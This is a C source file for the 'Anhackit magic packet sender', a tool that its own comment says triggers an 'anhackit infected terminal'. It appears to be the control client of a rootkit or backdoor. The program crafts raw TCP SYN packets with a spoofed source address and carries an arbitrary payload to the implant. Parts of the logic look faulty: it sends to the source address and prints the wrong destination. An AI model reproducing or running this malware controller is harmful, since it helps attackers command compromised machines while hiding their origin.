#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>

/*
    Anhackit magic packet sender - Developed by Anhackin

    Use this packet sender to send the magic packet
    to the anhackit infected terminal
*/

//Pseudo header needed for tcp header checksum calculation
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};


//Generic checksum calculation function
unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while(nbytes>1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if(nbytes==1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum+(sum>>16);
    answer = (short)~sum;

    return(answer);
}

//Magic packet sender
int main(int argc, char *argv[]) {
    //Need help?
    if(argc < 5) {
        printf("Usage: %s <source_ip> <dest_ip> <dest_port> <payload>\n", argv[0]);
        exit(1);
    }

    //Create a raw socket
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s == -1) {
        perror("Failed to create socket!\n");
        exit(1);
    }

    //Datagram to represent the packet
    char datagram[4096];
    memset(datagram, 0, 4096);

    //Source ip
    char source_ip[32];
    strcpy(source_ip, argv[1]);

    //IP header
    struct iphdr *iph = (struct iphdr*) datagram;

    //TCP header
    struct tcphdr *tcph = (struct tcphdr*) (datagram+sizeof(struct ip));

    //Payload
    char *payload = datagram+sizeof(struct iphdr)+sizeof(struct tcphdr);
    strcpy(payload, argv[4]);

    //Source address resolution
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(54458);
    sin.sin_addr.s_addr = inet_addr(source_ip);

    //Config IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr)+sizeof(struct tcphdr)+strlen(payload);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr(source_ip); //Spoof source ip
    iph->daddr = inet_addr(argv[2]);
    iph->check = csum((unsigned short *) datagram, iph->tot_len); //Checksum

    //Config TCP Header
    tcph->source = htons(54458);
    tcph->dest = htons(atoi(argv[3]));
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    //Config pseudo header
    struct pseudo_header psh;
    psh.source_address = inet_addr(source_ip);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr)+strlen(payload));

    //TCP checksum
    int psize = sizeof(struct pseudo_header)+sizeof(struct tcphdr)+strlen(payload);
    char *pseudogram = malloc(psize);
    memcpy(pseudogram, (char*) &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram+sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr)+strlen(payload));
    tcph->check = csum((unsigned short*) pseudogram, psize);

    //Tell the kernel that headers are included
    int one = 1;
    const int *val = &one;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL!\n");
        exit(0);
    }

    //Send the packet
    if(sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0) {
        perror("Magic packet send failed!\n");
    }
    //Packet sended successfully
    else {
        printf("\nMagic packet sent from %s to %s on port %d.\n", source_ip, argv[1], atoi(argv[3]));
        printf("\nPayload: %s\nTotal length : %d\n\n", argv[4], iph->tot_len);
    }

    return 0;
}
